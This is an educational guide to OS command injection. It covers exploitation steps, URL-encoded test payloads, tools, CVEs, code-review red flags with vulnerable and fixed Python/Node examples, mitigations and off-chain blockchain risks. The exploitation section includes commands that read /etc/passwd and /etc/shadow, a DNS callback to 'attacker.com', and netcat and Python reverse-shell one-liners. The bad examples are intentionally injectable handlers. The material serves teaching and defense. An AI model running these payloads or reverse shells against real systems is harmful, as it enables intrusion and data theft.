## 🧠 Description

- **What it is (in simple terms + technical explanation)**
    
    - **Simple Terms:** Command Injection is like having a robot that takes your spoken instructions and directly types them into a computer's command line. If you tell the robot "print report and then delete everything," it will do both. If a website takes your input and directly uses it to build a command for the server's operating system, an attacker can add extra, malicious commands.
        
    - **Technical Explanation:** Command Injection (also known as OS Command Injection) is a web application vulnerability that allows an attacker to execute arbitrary operating system commands on the server running the application. This occurs when an application passes user-supplied input to a system shell (e.g., Bash, cmd.exe) without proper sanitization or validation. The attacker injects shell metacharacters (like `&`, `|`, `&&`, `||`, `;`, `` ` ``, `$(...)`) to append or chain their own commands to the legitimate command, which are then executed by the underlying operating system.
        
- **Where it occurs (context: frontend, backend, API, blockchain, etc.)**
    
    - Primarily occurs in the **backend application**, specifically when the application interacts with the underlying operating system's shell.
        
    - Common in features that:
        
        - Execute external programs or scripts (e.g., `ping`, `nslookup`, `grep`, image processing tools).
            
        - Generate reports or files using system commands.
            
        - Perform system administration tasks (e.g., managing users, configuring network interfaces).
            
    - Can occur in web applications, APIs, or any server-side script that shells out to the OS.
        
- **Root cause (e.g. untrusted input, broken auth, etc.)**
    
    - **Untrusted Input:** The fundamental root cause. User-supplied input is directly concatenated into a string that is then passed to an OS command interpreter without being properly escaped or validated.
        
    - **Insecure API Usage:** Using functions or APIs (e.g., `system()`, `exec()`, `Runtime.exec()`, `subprocess.run(shell=True)`) that invoke a shell interpreter, rather than executing a program directly with arguments.
        
    - **Lack of Sanitization/Escaping:** Failure to neutralize shell metacharacters in user input.
        
- **The different types (if applicable)**
    
    - **Blind Command Injection:** The application does not return the output of the executed command directly in the HTTP response. Attackers rely on out-of-band techniques (e.g., DNS lookups, time delays, file creation/deletion) to confirm execution.
        
    - **Error-based Command Injection:** The application returns system errors that include the output of the injected command or indicate its execution.
        
    - **Output-based Command Injection:** The application directly reflects the output of the injected command in the HTTP response.
        

## 🧪 Exploitation Techniques

- **Step-by-step walkthrough of how it’s exploited**
    
    1. **Identify Vulnerable Input Point:** Find a web form field, URL parameter, or API request body parameter where the application might be executing a system command with user-supplied input. Common examples include:
        
        - A "ping" utility that takes an IP address.
            
        - A "file conversion" service that takes a filename.
            
        - A "system status" page that runs a `grep` command.
            
    2. **Test for Command Injection:**
        
        - Inject common shell metacharacters to break out of the original command and append a simple test command.
            
            - _Linux:_ `&`, `|`, `&&`, `||`, `;`, `` ` ``, `$(...)`
                
            - _Windows:_ `&`, `|`, `&&`, `||`, `&`, `|`
                
        - _Example Payload:_ If the application runs `ping -c 4 <user_input>`, try injecting `127.0.0.1; ls -la`.
            
        - Observe the response:
            
            - **Output-based:** Does the `ls -la` output appear in the web response?
                
            - **Error-based:** Does a system error message reveal the command output?
                
            - **Blind (Time-based):** Inject a time-delay command (e.g., `127.0.0.1; sleep 5`) and observe if the response is delayed.
                
            - **Blind (Out-of-band):** Inject a command that triggers a DNS lookup to an attacker-controlled domain (e.g., `127.0.0.1; nslookup attacker.com`) and monitor DNS logs.
                
    3. **Command Execution & Information Gathering:**
        
        - Once confirmed, execute commands to gather information about the server:
            
            - `whoami` (current user)
                
            - `id` (user and group IDs)
                
            - `ifconfig` / `ip a` (network interfaces)
                
            - `ls -la /` (list root directory)
                
            - `cat /etc/passwd` / `cat /etc/shadow` (Linux user information)
                
            - `ipconfig /all` (Windows network info)
                
            - `type C:\Windows\System32\drivers\etc\hosts` (Windows hosts file)
                
    4. **Establish Persistence/Reverse Shell:**
        
        - Attempt to download and execute a reverse shell script from an attacker-controlled server.
            
        - Use commands to establish a direct reverse shell connection back to the attacker's machine (e.g., `nc -e /bin/sh attacker_ip port`, `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`).
            
- **Payload examples (URL-encoded for web context)**
    
    - **Linux (using `;`):** `127.0.0.1;%20ls%20-la%20/`
        
    - **Linux (using `&`):** `127.0.0.1%20%26%26%20cat%20/etc/passwd`
        
    - **Linux (using backticks):** `` `ls -la` `` (often needs to be within another command, e.g., `echo%20%60ls%20-la%60`)
        
    - **Linux (using `$`()):** `$(id)` (often needs to be within another command, e.g., `echo%20$(id)`)
        
    - **Windows (using `&`):** `127.0.0.1%20%26%20dir%20C:\`
        
    - **Windows (using `|`):** `127.0.0.1%20%7C%20whoami`
        
    - **Blind (Time-based - Linux):** `127.0.0.1%3B%20sleep%205`
        
    - **Blind (Out-of-band - Linux):** `127.0.0.1%3B%20nslookup%20attacker.com`
        
- **Tools used**
    
    - **Burp Suite (or OWASP ZAP):** For intercepting requests, modifying parameters, and automating payload injection (Intruder).
        
    - **`curl` / Postman / Insomnia:** For crafting and sending custom HTTP requests with payloads.
        
    - **Netcat (`nc`):** For setting up listeners for reverse shells.
        
    - **DNS Listener:** For blind out-of-band detection.
        
    - **Web Shells:** If file write access is obtained, uploading a web shell for easier command execution.
        
- **Real-world examples (CVE, bugs in libraries or apps)**
    
    - **Shellshock (CVE-2014-6271):** A critical RCE vulnerability in the Bash shell that allowed attackers to inject commands via environment variables, affecting numerous web servers and other services.
        
    - **ImageMagick (ImageTragick - CVE-2016-3714):** While primarily an image processing vulnerability, some exploits involved command injection through specially crafted image file names or content that were then processed by external system calls.
        
    - **Many IoT devices and routers:** Often have web interfaces with vulnerable command injection points in diagnostic tools (e.g., ping, traceroute functionality).
        

## 🔎 Code Review Tips

- **What patterns or red flags to look for**
    
    - **Direct Concatenation into Shell Commands:** Any instance where user-supplied input is directly concatenated into a string that is then passed to a function that executes shell commands.
        
    - **Use of Shell-Executing Functions:** Calls to `system()`, `exec()`, `popen()`, `Runtime.getRuntime().exec()`, `subprocess.run(shell=True)`, `os.system()`, `os.popen()`, `backticks (``)` in Ruby/PHP, `eval()` in some contexts.
        
    - **Lack of Escaping:** No explicit escaping of shell metacharacters (`&`, `|`, `;`, etc.) from user input.
        
    - **External Program Calls:** Any time the application calls an external program (e.g., `ping`, `nslookup`, `ffmpeg`, `convert`) and uses user input as part of the arguments.
        
- **Bad vs good code examples (especially Python and TS)**
    
    - **Bad Python (using `os.system`):**
        
        ```python
        # BAD: Direct concatenation into os.system
        import os
        from flask import Flask, request
        
        app = Flask(__name__)
        
        @app.route('/ping')
        def ping_host_bad():
            hostname = request.args.get('host') # Attacker controls this
            if hostname:
                # VULNERABLE: Attacker can inject commands like '127.0.0.1; rm -rf /'
                command = f"ping -c 4 {hostname}"
                os.system(command) # Executes command via shell
                return f"Executed: {command}"
            return "Please provide a host."
        ```
        
    - **Good Python (using `subprocess.run` with `shell=False`):**
        
        ```python
        # GOOD: Using subprocess.run with shell=False (default and recommended)
        # This treats arguments as separate tokens, preventing shell metacharacter injection.
        import subprocess
        from flask import Flask, request
        
        app = Flask(__name__)
        
        @app.route('/ping')
        def ping_host_good():
            hostname = request.args.get('host')
            if hostname:
                # GOOD: Arguments are passed as a list, preventing shell interpretation
                try:
                    # Validate hostname strictly (e.g., regex for IP or domain)
                    # This is an additional layer of defense.
                    if not hostname.replace('.', '').isdigit() and not '.' in hostname: # Simplified check
                        return "Invalid hostname format.", 400
        
                    result = subprocess.run(['ping', '-c', '4', hostname], capture_output=True, text=True, check=True)
                    return f"Ping output:\n{result.stdout}"
                except subprocess.CalledProcessError as e:
                    return f"Error executing ping: {e.stderr}", 500
                except Exception as e:
                    return f"An unexpected error occurred: {e}", 500
            return "Please provide a host."
        ```
        
    - **Bad TypeScript/Node.js (using `child_process.exec`):**
        
        ```ts
        // BAD: Using user input directly in child_process.exec
        const { exec } = require('child_process');
        const express = require('express');
        const app = express();
        
        app.get('/lookup', (req, res) => {
            const domain = req.query.domain; // Attacker controls this
            if (domain) {
                // VULNERABLE: Attacker can inject commands like 'example.com; rm -rf /'
                exec(`nslookup ${domain}`, (error, stdout, stderr) => {
                    if (error) {
                        return res.status(500).send(`Error: ${error.message}`);
                    }
                    res.send(`Lookup result:\n${stdout}`);
                });
            } else {
                res.send('Please provide a domain.');
            }
        });
        ```
        
    - **Good TypeScript/Node.js (using `child_process.spawn` or `execFile`):**
        
        ```ts
        // GOOD: Using child_process.spawn or execFile, which treats arguments as separate tokens
        const { spawn } = require('child_process');
        const express = require('express');
        const app = express();
        
        app.get('/lookup', (req, res) => {
            const domain = req.query.domain;
            if (domain) {
                // GOOD: Arguments are passed as a list, preventing shell interpretation
                // Also, validate domain strictly
                const domainRegex = /^[a-zA-Z0-9.-]+$/;
                if (!domainRegex.test(domain as string)) {
                    return res.status(400).send('Invalid domain format.');
                }
        
                const nslookupProcess = spawn('nslookup', [domain as string]);
                let stdout = '';
                let stderr = '';
        
                nslookupProcess.stdout.on('data', (data) => { stdout += data.toString(); });
                nslookupProcess.stderr.on('data', (data) => { stderr += data.toString(); });
        
                nslookupProcess.on('close', (code) => {
                    if (code !== 0) {
                        return res.status(500).send(`Error: ${stderr}`);
                    }
                    res.send(`Lookup result:\n${stdout}`);
                });
        
                nslookupProcess.on('error', (err) => {
                    console.error('Failed to start nslookup process:', err);
                    res.status(500).send('Internal server error.');
                });
        
            } else {
                res.send('Please provide a domain.');
            }
        });
        ```
        
- **What functions/APIs are often involved**
    
    - **Python:** `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, `subprocess.run(shell=True)`, `subprocess.Popen(shell=True)`.
        
    - **Node.js:** `child_process.exec()`, `child_process.execSync()`.
        
    - **Java:** `Runtime.getRuntime().exec()`.
        
    - **PHP:** `` ` ` `` (backticks), `shell_exec()`, `exec()`, `passthru()`, `system()`.
        
    - **Ruby:** `` ` ` `` (backticks), `system()`, `exec()`.
        
    - **C/C++:** `system()`, `popen()`, `execve()`, `execl()`, `fork()`.
        
- **Where in the app codebase you'd usually find this**
    
    - **Utility Functions/Modules:** Any part of the code that needs to interact with the underlying OS (e.g., image resizing, file conversions, network diagnostics).
        
    - **API Endpoints:** Especially those that offer "diagnostics," "debug," "admin," or "utility" features.
        
    - **Configuration Parsers:** If configuration files allow execution of external commands.
        
    - **File Upload Handlers:** If uploaded files are processed by external tools.
        
    - **Search/Filtering Logic:** If search terms are passed to `grep` or similar tools.
        

## 🛡️ Mitigation Strategies

- **Input validation/sanitization**
    
    - **Primary Mitigation: Avoid Shell Execution Entirely:** The safest approach is to avoid calling out to the operating system shell with user-supplied input. Use safer, language-specific APIs that execute programs directly without involving a shell.
        
        - _Python:_ Use `subprocess.run()` or `subprocess.Popen()` with `shell=False` (which is the default). Pass arguments as a list of strings.
            
        - _Node.js:_ Use `child_process.spawn()` or `child_process.execFile()` instead of `child_process.exec()`.
            
        - _Java:_ Use `Runtime.getRuntime().exec(String[] cmdarray)` instead of `Runtime.getRuntime().exec(String command)`.
            
    - **Strict Whitelist Validation:** If shell execution is absolutely unavoidable, strictly validate user input against a whitelist of allowed characters, formats, or values. Reject anything that doesn't conform.
        
    - **Escape Shell Metacharacters:** If user input must be included in a shell command string, use language-specific functions to escape all shell metacharacters. (e.g., `shlex.quote()` in Python, `escapeshellarg()` in PHP). This is less secure than avoiding the shell, but better than nothing.
        
- **Encoding/escaping best practices**
    
    - Not directly applicable to preventing command injection, but crucial for other vulnerabilities if command output is reflected.
        
- **Framework-specific protections (e.g., React auto-escapes HTML)**
    
    - Many frameworks offer safer ways to interact with the OS or abstract away direct shell calls. Leverage these.
        
- **Secure configurations (headers, CSPs, etc.)**
    
    - **Least Privilege:** Run the application process with the lowest possible OS user privileges. This limits the impact of a successful command injection (e.g., attacker can't write to `/etc/passwd`).
        
    - **Chroot Jails/Containers:** Confine the application process to a restricted filesystem environment (chroot jail) or a container (Docker, Kubernetes) with strict security policies (e.g., AppArmor/SELinux profiles, seccomp filters) to limit what commands can be executed and what files can be accessed.
        
    - **Disable Dangerous Functions:** In environments like PHP, disable dangerous functions (`exec`, `shell_exec`, `system`, `passthru`) in `php.ini` if they are not needed.
        
    - **Network Segmentation:** Isolate application servers from sensitive internal networks to prevent lateral movement if RCE is achieved.
        
- **Defense-in-depth**
    
    - **Web Application Firewall (WAF):** Configure WAF rules to detect and block common shell metacharacters and command injection payloads in HTTP requests.
        
    - **Intrusion Detection/Prevention Systems (IDS/IPS):** Monitor for suspicious command execution patterns or unusual outbound network connections from application servers.
        
    - **File Integrity Monitoring (FIM):** Detect unauthorized changes to system files that might indicate a successful RCE.
        
    - **Comprehensive Logging & Monitoring:** Log all command executions by the application, including the full command string and arguments. Alert on any unusual or unauthorized commands.
        
    - **Regular Security Audits & Pentesting:** Conduct thorough manual code reviews and penetration tests specifically targeting command injection vulnerabilities.
        
    - **Automated Security Testing (SAST/DAST):** Use SAST tools to identify `os.system()` or `child_process.exec()` calls with user input. Use DAST tools to fuzz input fields for command injection.
        

## 🔐 Blockchain Context (if applicable)

- **How this vuln appears in smart contracts or crypto wallet code**
    
    - **Smart Contracts (Solidity): Not applicable.** Smart contracts run on the Ethereum Virtual Machine (EVM) or similar blockchain-specific virtual machines. These are isolated, sandboxed environments that do not have direct access to the underlying operating system shell. Therefore, classical OS Command Injection is not a vulnerability in smart contract code itself.
        
    - **Off-chain Components of dApps/Wallets/Nodes:** This is where Command Injection can occur. If a centralized backend service for a dApp, a desktop/mobile crypto wallet application, or a blockchain node implementation (e.g., Geth, Bitcoin Core) is written in a language that interacts with the OS shell (like C++, Python, Node.js) and processes untrusted input, it could be vulnerable.
        
        - _Example:_ A blockchain explorer's backend service that offers a "diagnostics" feature to `ping` a user-supplied IP address on the server. If this feature is vulnerable, an attacker could inject commands to compromise the explorer's server.
            
        - _Example:_ A crypto wallet's update mechanism uses an external command-line tool, and a vulnerability allows command injection during the update process, leading to RCE on the user's machine and private key theft.
            
        - _Example:_ A custom blockchain node management script that takes user input for configuration and directly executes shell commands without sanitization.
            
- **Web3-specific risks (e.g., RPC abuse, signing UI attacks)**
    
    - **Node Compromise:** A command injection vulnerability in a blockchain node's management interface or backend could lead to RCE on the node. This could allow an attacker to:
        
        - Steal local private keys (if the node is used for block signing).
            
        - Manipulate RPC responses.
            
        - Perform **RPC abuse** by initiating unauthorized transactions or queries.
            
        - Pivot to other systems on the node's network.
            
    - **Wallet Compromise:** RCE on a user's machine via command injection in a wallet application could lead to **private key exfiltration** and **unauthorized transaction signing** (bypassing the UI).
        
    - **Supply Chain Attacks:** Command injection in build scripts or deployment tools for smart contracts or dApps could allow an attacker to inject malicious code into the final deployed artifacts.